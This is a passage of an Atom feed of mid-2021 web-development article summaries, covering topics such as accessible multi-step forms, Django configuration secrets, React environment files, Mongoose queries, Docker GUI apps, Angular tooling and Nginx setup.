The labels will disappear when there isn't enough horizontal space for them, but the form isn't smart enough to figure out the perfect breakpoint on its own: you'll have to manually specify that value in multi-step-nav.css. 
Why add next and previous buttons in each step instead of reusing the same buttons everywhere? Doing it like this actually helps with the tabbing behavior: if you've tabbed to a next/previous button and press Enter, tabbing again will move you to the top of the new section, instead of tabbing out of the form towards the bottom of the document.
There's one accessibility feature I couldn't seem to figure out, however. When using NVDA (the most popular desktop screen reader according to the latest WebAIM survey) in browse mode, using the down arrow after pressing the Next or Previous button won't start reading at the top of the newly selected section. Anyone out there know how to fix this? 🙂
Cover photo by Kelly Sikkema on Unsplash]]></summary>
        <author>
            <name>Nicolas Trahan</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How to Keep Configuration Secrets out of a Django Project]]></title>
        <id>https://dev.to/tino_muc/how-to-keep-configuration-secrets-out-of-a-django-project-k07</id>
        <link href="https://dev.to/tino_muc/how-to-keep-configuration-secrets-out-of-a-django-project-k07"/>
        <updated>2021-06-02T21:58:55.000Z</updated>
        <summary type="html"><![CDATA[It is best practice to hide your configuration details and not include them in version control for the sake of security and independence of project instance. Getting straight to the point here is how to do it using python decouple library.  
Install decouple pip install python-decouple or [https://pypi.org/project/python-decouple/].
Create file named .env or .ini under the route of your project.
Add ignore for .env if you are using git.
Retrieve the settings by importing decouple into the settings.py file and replacing variables to hide with config.
5 . Test the application
This is how our initial exposed settings.py looks like before exclusion.
import os

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SECRET_KEY = '3izb^ryglmyscret_key_here'
DEBUG = True
DATABASES …]]></summary>
        <author>
            <name>TinoMuchenje</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How to Design Your Own Learning Plan for Any Tech Stack]]></title>
        <id>60b3ccee11ffb70827ef9bc0</id>
        <link href="https://www.freecodecamp.org/news/how-to-design-your-own-learning-plan-for-any-tech-stack/"/>
        <updated>2021-06-02T21:18:15.000Z</updated>
        <summary type="html"><![CDATA[One of the most difficult things about getting started in a new career as a developer is figuring out exactly what you should be learning – and then translating that into an effective plan. There are so many resources out there for learning, so lack of information is not the problem.]]></summary>
        <author>
            <name>freeCodeCamp.org</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Debugging iOS Safari]]></title>
        <id>https://css-tricks.com/?p=341724</id>
        <link href="https://css-tricks.com/debugging-ios-safari/"/>
        <updated>2021-06-02T21:15:28.000Z</updated>
        <summary type="html"><![CDATA[How do I debug Safari on iOS?
These are my general steps, starting with not even using iOS Safari.
1. Is this just a small-screen problem?
Lemme just use the device mode in Chrome quick.
Note that this does a …
The post Debugging iOS Safari appeared first on CSS-Tricks.
You can support CSS-Tricks by being an MVP Supporter.]]></summary>
        <author>
            <name>Chris Coyier</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Vimrc Configuration Guide - How to Customize Your Vim Code Editor with Mappings, Vimscript, Status Line, and More]]></title>
        <id>60a699b0906c5207e3a7f5ab</id>
        <link href="https://www.freecodecamp.org/news/vimrc-configuration-guide-customize-your-vim-editor/"/>
        <updated>2021-06-02T20:44:22.000Z</updated>
        <summary type="html"><![CDATA[Configuring your .vimrc file lets you use the full power of Vim. With a customized .vimrc file you can increase your Vim powers tenfold. In this article I will show you a few ways you can customize your .vimrc file. I will go over: Basic SettingsPluginsFoldingVimscriptStatus lineFirst create the following]]></summary>
        <author>
            <name>freeCodeCamp.org</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Nmr]]></title>
        <id>https://dev.to/japrozsaini/nmr-271a</id>
        <link href="https://dev.to/japrozsaini/nmr-271a"/>
        <updated>2021-06-02T19:27:09.000Z</updated>
        <summary type="html"><![CDATA[Nmr






Nmr (Node module resolver) is a command line utility that stores npm modules in a safe place and prevetn your from installing the same module for different projects again and again.
nmr is aimed for reducing the space hogged by the node_modules folder in ever node.js project.
To install nmr, enter the following command in the terminal:
npm install -g @svel-ai/nmr@latest

To use nmr you have to install package globally, and then add them to your project.
For example, if you want to use the commander module in your project, you will have to install the commander module to your system through the following command:
nmr install commander

The above command can be run form anywhere in the terminal.
To use the module in your project, run the following command inside of your project directory:
npm init -y
nmr add commander

That's it. Your ready to use commander. You can use it in your project and import it normally
const { program } = require("commander");
// import { program } from "commander" // If you are using ES6 syntax
// ...

We love adding new features to our projects. If you have a new idea, a new bug report or a feature request, please feel free to create a new issue and explain.
MIT]]></summary>
        <author>
            <name>Japroz Saini</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[AWS Security Groups - Once And For All]]></title>
        <id>https://dev.to/doitintl/aws-security-groups-once-and-for-all-176f</id>
        <link href="https://dev.to/doitintl/aws-security-groups-once-and-for-all-176f"/>
        <updated>2021-06-02T19:03:59.000Z</updated>
        <summary type="html"><![CDATA[As part of securing applications in the cloud, it's important to set the proper network rules, for maximum security and to minimize collateral damage.
Here's a quote from the official HIPAA requirement for Transmission Security.
A covered entity must implement technical security measures that guard against unauthorized access to e-PHI that is being transmitted over an electronic network.
For those of you who are not familiar with HIPAA, it's a very strict regulation that requires protecting medical records and other personal health information (PHI). 
Most startup companies that develop a product for the medical-healthcare sector, aspire to become HIPAA compliant. 
Here's the question you need to ask yourself when it comes to Transmission Security
What security measures are currently used …]]></summary>
        <author>
            <name>Meir Gabay</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[A lost boat, a radar and how to implement a binary search in Javascript]]></title>
        <id>https://dev.to/marcostl/a-lost-boat-a-radar-and-how-to-implement-a-binary-search-in-javascript-573d</id>
        <link href="https://dev.to/marcostl/a-lost-boat-a-radar-and-how-to-implement-a-binary-search-in-javascript-573d"/>
        <updated>2021-06-02T18:40:40.000Z</updated>
        <summary type="html"><![CDATA[You are part of a rescue operation for a lost boat in the sea.
You have a radar capable of telling you if a boat is in a specific region.
Your goal is to save the crew by coding a function that will return the location of the boat
This was a coding interview question that I was asked when I was searching for my first programming job. We'll have a look at how we can solve it and we'll learn how to implement a binary search algorithm in JavaScript along the way.
The task is clear but the interviewer shared a couple more details about the problem:
For simplification purposes, consider the sea is a rectangle grid divided in square cells.
Given inputs: dimensions (width and height) of the sea.
Expected output: location (cell coordinates) of the boat.

We'll consider that the radar takes an area…]]></summary>
        <author>
            <name>marcostl</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Secure and minimal APIs using .NET 6, C# 10 and Azure Active Directory]]></title>
        <id>https://dev.to/425show/secure-and-minimal-apis-using-net-6-c-10-and-azure-active-directory-197i</id>
        <link href="https://dev.to/425show/secure-and-minimal-apis-using-net-6-c-10-and-azure-active-directory-197i"/>
        <updated>2021-06-02T17:52:32.000Z</updated>
        <summary type="html"><![CDATA[Microsoft Build 2021 was insane and packed-full with new features, product announcements and capabilities. We also got a glance on the things that are to come in the coming year. I particularly enjoyed the sessions around .NET and Azure PaaS/FaaS! You can catch up on all the content on demand here. 
In one of these sessions, I saw Maria Nagagga and Stephen Halter present a very minimalistic API built with .NET 6 and C#10. There are some exciting announcements around the new version of .NET and many language improvements. I have to admit that the new .NET 6 (currently in Preview 4) looks a lot like a barebones Node.js API which is great since we, the developers, have to write a lot less code to achieve what we need. Less code == less bugs!
I've toyed around with minimal APIs using the Feath…]]></summary>
        <author>
            <name>Christos Matskas</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Multiple environments in Create React App]]></title>
        <id>https://dev.to/ninuvarghese/multiple-environments-in-create-react-app-dkj</id>
        <link href="https://dev.to/ninuvarghese/multiple-environments-in-create-react-app-dkj"/>
        <updated>2021-06-02T17:38:17.000Z</updated>
        <summary type="html"><![CDATA[In this article we are going to learn how to configure multiple environments in a single React application. For example, you might want your dev environment connected to your dev API Endpoint, QA to QA endpoint and production to a production endpoint. We could solve this by using a single .env file but, each time you push your code to specific environments you need to remember to change the endpoint values, which is a slight headache and can be error prone. Let’s see how we can solve this!
 
First, get the package env-cmd from npm by running
npm install — save-dev env-cmd
Next, create your environment specific .env files. In this example, I’ve created a folder named “environments” in my root directory (same level as package.json). Important the environment variables MUST start with REACT_APP_ . Read more here.
REACT_APP_API_END_POINT==http://my-dev-url.com

Please note .dev.env, .qa.env and .prod.env are three separate files in the environments folder. See below

Next, update the package.json . Update the scripts portion of your package.json to include the following:
“scripts”: {


Next start your local/dev react application by running
npm run start:dev
You can test your env variable in your app by doing the following
console.log(process.env.REACT_APP_API_END_POINT);
For QA and Production build replace the command npm run build to the newly added environment specific command npm run build:qa or npm run build:prod respectively. (For example, if you are on AWS, edit the buildspec on Codebuild and replace npm run build with npm run build:qa or npm run build:prod)
I hope this article was helpful. Thanks and Cheers!]]></summary>
        <author>
            <name>Ninu Varghese</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Mongoose deep populate]]></title>
        <id>https://dev.to/ognanshissi/mongoose-deep-populate-31p4</id>
        <link href="https://dev.to/ognanshissi/mongoose-deep-populate-31p4"/>
        <updated>2021-06-02T16:58:59.000Z</updated>
        <summary type="html"><![CDATA[Sometimes you want to populate more than one level deep a schema using mongoose. i will share with you today how i use pure mongoose populate method to access more than one level deep data relation.
Suppose you have a User model that has many Posts and each post has Category.
Here we are going to retrieve a user with all posts that are not deleted with the category name and description populated.
import * as mongoose from 'mongoose';
import { Schema } from 'mongoose';

// Category schema
export const categorySchema = new Schema({
    categoryName: {type: String, unique: true},
    description: {type: String},
    isDeleted: {type: Boolean, default: false}
}, {timestamps: true});

// Post schema
const postSchema = new Schema({
    title: { type: String },
    description: { type: String },
    category: { type: Schema.Types.ObjectId, ref: "Category"},
    isDeleted: { type: Boolean, default: false }
});

// User schema
const userSchema = new Schema({
    username: { type: String, unique: true },
    email: { type: String, unique: true },
    posts: [
     { type: Schema.Types.ObjectId, ref: "Post" }
    ]
});

export const Category = mongoose.model('Category', categorySchema);
export const Post = mongoose.model('Post', postSchema);
export const User = mongoose.model('User', userSchema);

// Query to get all posts with the category 
const userWithPosts = await User.findById(id).populate({
   path: 'posts',
   model: Post,
   match: { isDeleted: false },
   populate: {
      path: 'category',
      model: Category,
      select: "categoryName description"
   }
}).exec();








  
  
  Thanks]]></summary>
        <author>
            <name>Ambroise BAZIE</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Docker without Docker]]></title>
        <id>https://dev.to/superfly/docker-without-docker-590i</id>
        <link href="https://dev.to/superfly/docker-without-docker-590i"/>
        <updated>2021-06-02T15:42:48.000Z</updated>
        <summary type="html"><![CDATA[We’re Fly.io. We take container images and run them on our hardware around the world.  It’s pretty neat, and you should check it out; with an already-working Docker container, you can be up and running on Fly in well under 10 minutes.
Even though most of our users deliver software to us as Docker containers, we don’t use Docker to run them. Docker is great, but we’re high-density multitenant, and despite strides, Docker’s isolation isn’t strong enough for that. So, instead, we transmogrify container images into Firecracker micro-VMs.
Let's demystify that.
They do their best to make it look a lot more complicated, but OCI images — OCI is the standardized container format used by Docker — are pretty simple.  An OCI image is just a stack of tarballs.
Backing up: most people build images from …]]></summary>
        <author>
            <name>Fly.io</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[A Crash Course in WordPress Block Filters]]></title>
        <id>https://css-tricks.com/?p=341442</id>
        <link href="https://css-tricks.com/a-crash-course-in-wordpress-block-filters/"/>
        <updated>2021-06-02T13:35:53.000Z</updated>
        <summary type="html"><![CDATA[Blocks in WordPress are great. Drop some into the page, arrange them how you like, and you’ve got a pretty sweet landing page with little effort. But what if the default blocks in WordPress need a little tweaking? Like, what …
The post A Crash Course in WordPress Block Filters appeared first on CSS-Tricks.
You can support CSS-Tricks by being an MVP Supporter.]]></summary>
        <author>
            <name>Dmitry Mayorov</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Are Custom Properties a “Menu of What Will Change”?]]></title>
        <id>https://css-tricks.com/?p=341572</id>
        <link href="https://css-tricks.com/are-custom-properties-a-menu-of-what-will-change/"/>
        <updated>2021-06-02T13:35:40.000Z</updated>
        <summary type="html"><![CDATA[PPK laid out an interesting situation in “Two options for using custom properties” where he and Stefan Judis had two different approaches for doing the same thing with custom properties. In one approach, hover and focus styles for a …
The post Are Custom Properties a “Menu of What Will Change”? appeared first on CSS-Tricks.
You can support CSS-Tricks by being an MVP Supporter.]]></summary>
        <author>
            <name>Chris Coyier</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How To Fix Cumulative Layout Shift (CLS) Issues]]></title>
        <id>https://smashingmagazine.com/2021/06/how-to-fix-cumulative-layout-shift-issues/</id>
        <link href="https://smashingmagazine.com/2021/06/how-to-fix-cumulative-layout-shift-issues/"/>
        <updated>2021-06-02T12:30:00.000Z</updated>
        <summary type="html"><![CDATA[Google’s Core Web Vitals initiative has taken the SEO and Web Performance worlds by storm and many sites are busy optimizing their Page Experience to maximize the ranking factor. The Cumulative Layout Shift metric is causing trouble to a lot of sites, so let’s have a look at ways of addressing any issues for that metric.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Barry Pollard)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[The Summer Sale is Now Live At PrimeStore!]]></title>
        <id>https://dev.to/primetek/the-summer-sale-is-now-live-at-primestore-25h7</id>
        <link href="https://dev.to/primetek/the-summer-sale-is-now-live-at-primestore-25h7"/>
        <updated>2021-06-02T11:59:23.000Z</updated>
        <summary type="html"><![CDATA[Summer has arrived at PrimeStore to bring up to 50% discount on all the Premium Templates, Theme Designers, PrimeFaces Elite, PrimeNG LTS Subscriptions and License Upgrades!
Visit PrimeStore now to begin shopping.]]></summary>
        <author>
            <name>PrimeTek</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Improving The Performance Of An Online Store (Case Study)]]></title>
        <id>https://smashingmagazine.com/2021/06/front-end-performance-online-store-jewellerybox/</id>
        <link href="https://smashingmagazine.com/2021/06/front-end-performance-online-store-jewellerybox/"/>
        <updated>2021-06-02T10:30:00.000Z</updated>
        <summary type="html"><![CDATA[Getting a good performance score from Google is hard for any website — but doing so for an online store is even harder. We achieved green scores — even several for mobile. Here is how we did it.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Jennifer Brehm)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[NgSimpleState. Simple state management in Angular with only Services and RxJS.]]></title>
        <id>https://dev.to/nigrosimone/ngsimplestate-simple-state-management-in-angular-with-only-services-and-rxjs-34if</id>
        <link href="https://dev.to/nigrosimone/ngsimplestate-simple-state-management-in-angular-with-only-services-and-rxjs-34if"/>
        <updated>2021-06-02T05:45:28.000Z</updated>
        <summary type="html"><![CDATA[One of the most challenging things in software development is state management. Currently there are several state management libraries for Angular apps: NGRX, NGXS, Akita... 
But what if you don't want to learn, setup, and deal with all the boilerplate for a simple project, what if you want to manage state by only using tools you already know well as an Angular developer.
In this write up, I'll show you a simple way of managing state by only using RxJS and Dependency Injection with NgSimpleState.
ng-simple-state





npm i ng-simple-state

NgSimpleStateModule into your AppModule





import { BrowserModule } from '@angular/platform-browser';
import { NgModule } from '@angular/core';
import { AppComponent } from './app.component';
import { CommonModule } from '@angular/common';
import { NgS…]]></summary>
        <author>
            <name>Nigro Simone</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[LUXARG another keyboard frirendly editor in PURE PYTHON]]></title>
        <id>https://dev.to/amzy0/luxarg-another-keyboard-frirendly-editor-for-linux-freebsd-538f</id>
        <link href="https://dev.to/amzy0/luxarg-another-keyboard-frirendly-editor-for-linux-freebsd-538f"/>
        <updated>2021-06-02T00:39:38.000Z</updated>
        <summary type="html"><![CDATA[LINK]]></summary>
        <author>
            <name>Amzy 0 |  محمد امین عظیمی</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Code blocks, but better]]></title>
        <id>https://css-tricks.com/?p=341720</id>
        <link href="https://ped.ro/blog/code-blocks-but-better"/>
        <updated>2021-06-01T22:08:48.000Z</updated>
        <summary type="html"><![CDATA[Pedro Duarte made a wishlist for styled code blocks in blog posts and documentation, then hand-rolls a perfect solution for that wishlist. For example, a feature to be able to highlight certain lines or words within the code block. The …
The post Code blocks, but better appeared first on CSS-Tricks.
You can support CSS-Tricks by being an MVP Supporter.]]></summary>
        <author>
            <name>Chris Coyier</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Running GUI Applications inside Docker Container]]></title>
        <id>https://dev.to/msamik/running-gui-applications-inside-docker-container-14ch</id>
        <link href="https://dev.to/msamik/running-gui-applications-inside-docker-container-14ch"/>
        <updated>2021-06-01T16:05:01.000Z</updated>
        <summary type="html"><![CDATA[What is DOCKER?
Docker is a set of platform as a service products that use OS-level virtualization to deliver software in packages called containers. Containers are isolated from one another and bundle their own software, libraries and configuration files; they can communicate with each other through well-defined channels.
What is GUI ?
The graphical user interface is a form of user interface that allows users to interact with electronic devices through graphical icons and audio indicator such as primary notation, instead of text-based user interfaces, typed command labels or text navigation.
Lets Directly Jump to Practicles : 
Docker Engine Must be Installed in the Base OS / Host .
To confirm whether docker is installed or not we can use :
Docker Engine must be in running state .
[root@os]~# systemctl status docker

We must have a docker image to execute our task .
[root@os]~# docker pull centos:latest
We will now create a Dockerfile in which we will specify our Requirements for our own custom Image
[root@os]~# vim Dockerfile 
FROM centos:latest

[root@os]~# docker build -t firefox:v1 .

docker build will help us to make our own customized image with tag firefox:v1

[root@os]~# docker run -it --name task2 -e DISPLAY=$DISPLAY --net=host firefox:v1

$DISPLAY == Enivornment Variable for our Display :0 is the main display.
[root@os]~# firefox

[root@os]~# jupyter notebook

In Addition to firefox i used jupyter notebook as a GUI APP.
Thanks for Visiting my Article]]></summary>
        <author>
            <name>Muhammad Sami Khanday</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Front-End Testing is For Everyone]]></title>
        <id>https://css-tricks.com/?p=341342</id>
        <link href="https://css-tricks.com/front-end-testing-is-for-everyone/"/>
        <updated>2021-06-01T14:17:43.000Z</updated>
        <summary type="html"><![CDATA[Testing is one of those things that you either get super excited about or kinda close your eyes and walk away. Whichever camp you fall into, I’m here to tell you that front-end testing is for everyone. In fact, …
The post Front-End Testing is For Everyone appeared first on CSS-Tricks.
You can support CSS-Tricks by being an MVP Supporter.]]></summary>
        <author>
            <name>Evgeny Klimenchenko</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Jetpack Boost Handles Critical CSS For You]]></title>
        <id>https://css-tricks.com/?p=341296</id>
        <link href="https://css-tricks.com/jetpack-boost-handles-critical-css-for-you/"/>
        <updated>2021-06-01T14:16:55.000Z</updated>
        <summary type="html"><![CDATA[Critical CSS is one of those things I see in my performance reports but always seem to ignore. I know what it means. It means to put only the CSS required to render things immediately visible in a <style>…
The post Jetpack Boost Handles Critical CSS For You appeared first on CSS-Tricks.
You can support CSS-Tricks by being an MVP Supporter.]]></summary>
        <author>
            <name>Geoff Graham</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Smashing Podcast Episode 38 With Ivan Akulov: Why Is My React App Slow?]]></title>
        <id>https://smashingmagazine.com/2021/06/smashing-podcast-episode-38/</id>
        <link href="https://smashingmagazine.com/2021/06/smashing-podcast-episode-38/"/>
        <updated>2021-06-01T14:00:00.000Z</updated>
        <summary type="html"><![CDATA[In this episode, we’re talking about React performance. What factors slow our React apps down, and how can we fix it? Drew McLellan talks to expert Ivan Akulov to find out.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Drew McLellan)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How to Load and View PDF Files in an Angular App]]></title>
        <id>https://dev.to/syncfusion/how-to-load-and-view-pdf-files-in-an-angular-app-bjb</id>
        <link href="https://dev.to/syncfusion/how-to-load-and-view-pdf-files-in-an-angular-app-bjb"/>
        <updated>2021-06-01T10:00:06.000Z</updated>
        <summary type="html"><![CDATA[This blog shows you how to display a PDF file in an Angular application using Syncfusion’s Angular PDF Viewer control.
The PDF Viewer control allows you to view, print, form-fill, and annotate PDF files in your web applications. It provides the best viewing experience with core interactions such as zooming, scrolling, text search, text selection, and copying. The thumbnail, bookmark, hyperlink, and table of contents support provide easy navigation within and outside the PDF files. The PDF Viewer component was developed from the ground up to be lightweight, responsive, modular, and touch-friendly.
*Note: * This PDF Viewer control requires a server-side back end Web API service to render PDF content.
The key features of the Angular PDF Viewer:
Toolbar : Built-in toolbar for better user inter…]]></summary>
        <author>
            <name>Suresh Mohan</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Setting Up A Currency Convertor With ExchangeRatesApi.io]]></title>
        <id>https://smashingmagazine.com/2021/06/currency-convertor-exchangeratesapi/</id>
        <link href="https://smashingmagazine.com/2021/06/currency-convertor-exchangeratesapi/"/>
        <updated>2021-06-01T09:00:00.000Z</updated>
        <summary type="html"><![CDATA[Amazon allows visitors to display prices in their own currency. Thanks to *ExchangeRatesApi.io*, we can do the same for our online shops, providing a better experience to our customers. Let’s find out how.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Leonardo Losoviz)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Highlight text in paragraphs with a simple directive in Angular]]></title>
        <id>https://dev.to/angular/highlight-text-in-paragraphs-with-a-simple-directive-in-angular-2da</id>
        <link href="https://dev.to/angular/highlight-text-in-paragraphs-with-a-simple-directive-in-angular-2da"/>
        <updated>2021-06-01T04:44:44.000Z</updated>
        <summary type="html"><![CDATA[How to highlight text in a paragraph with the help of directives in Angular. Especially helpful in highlighting text matching the search term. You could have come across this in your browser or IDE when you search for something, the matching items will be highlighted to point you to the exact place of occurrence.
Here is what we are going to build in this post. A very simple and straightforward highlight directive in Angular. We see something similar in chrome dev tools.
The idea is pretty simple. We just have to match the searched term and somehow wrap the matched text in a span or mark (ref) tag so that we can style them later according to our needs.
We are going to use Regex to find matches in our paragraph. Regex makes it very simple to do operations like this on strings. The directive…]]></summary>
        <author>
            <name>Adithya Sreyaj</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[v1.10.2]]></title>
        <id>https://github.com/osmoscraft/osmosfeed/releases/tag/v1.10.2</id>
        <link href="https://github.com/osmoscraft/osmosfeed/releases/tag/v1.10.2"/>
        <updated>2021-06-01T04:39:30.000Z</updated>
        <summary type="html"><![CDATA[Added: testing and CI/CD workflows]]></summary>
        <author>
            <name>Release notes from osmosfeed</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Angular : How to automate angular deployment for AWS S3 Angular Website??]]></title>
        <id>https://dev.to/rajeshkumaryadavdotcom/angular-how-to-automate-angular-deployment-for-aws-s3-angular-website-4g2d</id>
        <link href="https://dev.to/rajeshkumaryadavdotcom/angular-how-to-automate-angular-deployment-for-aws-s3-angular-website-4g2d"/>
        <updated>2021-06-01T03:31:38.000Z</updated>
        <summary type="html"><![CDATA[If you have hosted your angular app to AWS S3 then you can automate your ng build -prod and drag and drop to S3 bucket by simply following below steps -  
Step 1 - Add @jefiozie
/ngx-aws-deploy to your project and for this run below command (your angular CLI should be up-to-date)
ng add @jefiozie/ngx-aws-deploy

Step 2 - Provide necessary details to the terminal while step 1 is in progress.

You will be prompted for a couple of questions:

Your AWS Region

The bucket you would like the files to be uploaded.

The Secret Access Key

The Access key Id

The folder where the files should be uploaded (optional)  
Step 3 - Verify the details you have provided is correct, open angular.json and search for deploy and should be able to see below code -
angular.json is update with a new builder:

"dep…]]></summary>
        <author>
            <name>Rajesh Kumar Yadav</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[GUI Simples no Linux Utilizando Node.js e Zenity]]></title>
        <id>https://dev.to/ferfox1981/gui-simples-no-linux-utilizando-node-js-e-zenity-1haf</id>
        <link href="https://dev.to/ferfox1981/gui-simples-no-linux-utilizando-node-js-e-zenity-1haf"/>
        <updated>2021-06-01T02:12:53.000Z</updated>
        <summary type="html"><![CDATA[(Este post é uma tradução deste original em inglês)
Meus objetivos serão os seguintes:
Usar o Node.js para acessar dados financeiros relacionados a preços de títulos do Tesouro Direto;
Criar um mecanismo para de forma sistemática checar o preço dos títulos (minuto a minuto, ou hora por hora...);
Usar o Zenity para exibir uma notificação com o preço corrente do título.
As informações do Tesouro Direto podem ser achadas aqui. Além disso, se apertarmos o F12 e checarmos a aba Network, veremos o seguinte json sendo recebido pelo browser:
https://www.tesourodireto.com.br/json/br/com/b3/tesourodireto/service/api/treasurybondsinfo.json
const axios = require('axios');
const { exec } = require("child_process");
const https = require('https');



const instance = axios.create({
  httpsAgent: new htt…]]></summary>
        <author>
            <name>Fernando Raposo da Camara Silva</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Angular meetup videos from April, 2021]]></title>
        <id>https://dev.to/meetupfeedio/angular-meetup-videos-from-april-2021-odl</id>
        <link href="https://dev.to/meetupfeedio/angular-meetup-videos-from-april-2021-odl"/>
        <updated>2021-06-01T00:08:11.000Z</updated>
        <summary type="html"><![CDATA[MeetupFeed is back with a summary of all the exciting Angular meetup videos from April, 2021. Below you’ll find great meetup videos about different aspects of Angular, useful tips and some great tricks as well.
Systemizing Router Animations | Zack DeRose
NgRx Data and Websockets | Jay Bell
Debugging an Angular app | David Müllerchen
Token security and ESLint in Angular | Philippe De Ryck & James Henry
Can an Angular application store tokens in localStorage?
– Yes, of course! LocalStorage is persistent storage, so the token is available to all tabs and windows. It even survives a browser restart.
– No, absolutely not! LocalStorage is insecure, and an attacker will be able to steal the token.
Believe it or not, but both answers are correct. As simple as this question is, the answer is far fr…]]></summary>
        <author>
            <name>MeetupFeed</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Serverless Functions: The Secret to Ultra-Productive Front-End Teams]]></title>
        <id>https://css-tricks.com/?p=340465</id>
        <link href="https://css-tricks.com/serverless-functions-the-secret-to-ultra-productive-front-end-teams/"/>
        <updated>2021-05-31T17:16:22.000Z</updated>
        <summary type="html"><![CDATA[Modern apps place high demands on front-end developers. Web apps require complex functionality, and the lion’s share of that work is falling to front-end devs:
building modern, accessible user interfaces
creating interactive elements and complex animations
managing complex application state
…
The post Serverless Functions: The Secret to Ultra-Productive Front-End Teams appeared first on CSS-Tricks.
You can support CSS-Tricks by being an MVP Supporter.]]></summary>
        <author>
            <name>Jason Lengstorf</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Local: Always Getting Better]]></title>
        <id>https://css-tricks.com/?p=341482</id>
        <link href="https://css-tricks.com/local-always-getting-better/"/>
        <updated>2021-05-31T17:13:02.000Z</updated>
        <summary type="html"><![CDATA[I’ve been using Local for ages. Four years ago, I wrote about how I got all my WordPress sites running locally on it. I just wanted to give it another high five because it’s still here and still great. In …
The post Local: Always Getting Better appeared first on CSS-Tricks.
You can support CSS-Tricks by being an MVP Supporter.]]></summary>
        <author>
            <name>Chris Coyier</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Toggle your VPN connection with a shortcut, in Manjaro]]></title>
        <id>https://dev.to/shekari_ah/toggle-your-vpn-connection-with-a-shortcut-in-manjaro-10ie</id>
        <link href="https://dev.to/shekari_ah/toggle-your-vpn-connection-with-a-shortcut-in-manjaro-10ie"/>
        <updated>2021-05-31T15:55:55.000Z</updated>
        <summary type="html"><![CDATA[This is a little script that allows you to toggle your VPN connection by running a bash script. 
I mostly use it by assigning it to a shortcut (meta + v).]]></summary>
        <author>
            <name>Amir Hossein Shekari</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Using route tables to implement multiple-network-interface scenario]]></title>
        <id>https://dev.to/sagar027/using-route-tables-to-implement-multiple-network-interface-scenario-k1d</id>
        <link href="https://dev.to/sagar027/using-route-tables-to-implement-multiple-network-interface-scenario-k1d"/>
        <updated>2021-05-31T13:39:14.000Z</updated>
        <summary type="html"><![CDATA[There could scenarios where you would want to isolate traffic on network interfaces for specific layers of applications. Example, one interface attached to an application machine can act as a receiving endpoint for application-bound traffic and another network interface can act as a communication interface with the database / data layer. This scenario can be visualised as :

Now, lets see how this can be implemented. I am going to use Azure for demonstration.
In Azure, private networks are referred to as 'Virtual Networks' and sub-networks as 'Subnets’
Our virtual network's address space is : 10.0.16.0/22.
Here, as you can see we have our application linux machine (also referred to as Virtual Machine aka VM) in a virtual network. The VM has two network interfaces. One is in first subnet (l…]]></summary>
        <author>
            <name>sagar027</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Install Nginx on Ubuntu 20.04 Server]]></title>
        <id>https://dev.to/semirteskeredzic/install-nginx-on-ubuntu-20-04-server-12ni</id>
        <link href="https://dev.to/semirteskeredzic/install-nginx-on-ubuntu-20-04-server-12ni"/>
        <updated>2021-05-31T13:28:12.000Z</updated>
        <summary type="html"><![CDATA[Welcome to the short guide on how to install Nginx on your server running Ubuntu 20.04.
So what is Nginx? As per nginx.com: 
Nginx is open source software for web serving, reverse proxying, caching, load balancing, media streaming, and more. It started out as a web server designed for maximum performance and stability. In addition to its HTTP server capabilities, NGINX can also function as a proxy server for email (IMAP, POP3, and SMTP) and a reverse proxy and load balancer for HTTP, TCP, and UDP servers.
So in short, Nginx is a web server that has many capabilities in serving the content on server to the users.
You have to check that the server you want to install Nginx on is properly configured before proceeding so you can install and configure Nginx without any future issues. You can re…]]></summary>
        <author>
            <name>Semir Teskeredzic</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[O Paciente Terminal #2]]></title>
        <id>https://dev.to/kennyalves/o-paciente-terminal-2-115h</id>
        <link href="https://dev.to/kennyalves/o-paciente-terminal-2-115h"/>
        <updated>2021-05-31T13:05:55.000Z</updated>
        <summary type="html"><![CDATA[Em busca de um mestre Yoda


Como ficou decidido que o objetivo era se tornar um dev front-end, agora precisava desvendar o caminho das pedras para conseguir chegar a terra sonhada. 
Pra isso, precisava responder algumas perguntas como:
- Certo, mas por onde eu começo?
